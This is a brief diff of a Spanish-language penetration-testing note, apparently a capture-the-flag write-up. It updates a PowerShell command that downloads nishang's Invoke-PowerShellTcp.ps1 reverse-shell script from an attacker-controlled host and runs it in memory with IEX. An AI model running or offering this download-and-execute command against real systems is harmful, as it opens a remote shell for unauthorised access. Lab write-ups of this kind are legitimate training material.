@@ -315,8 +315,11 @@ vamos a utilizar el repositorio de [nishang](https://github.com/samratashok/nish
 llamamos el archivo desde la web con el siguiente comando
 
 ```python
-powershell IEX(New-Object Net.WebClient).downloadstring('http://10.10.14.73:9006/')
+powershell IEX(New-Object Net.WebClient).downloadstring('http://10.10.14.73:9006/Invoke-PowerShellTcp.ps1')
 ```
 
 ![[Pasted image 20240724154838.png]]
 
+`Server`
+con un servidor podemos 
+![[Pasted image 20240724155109.png]]
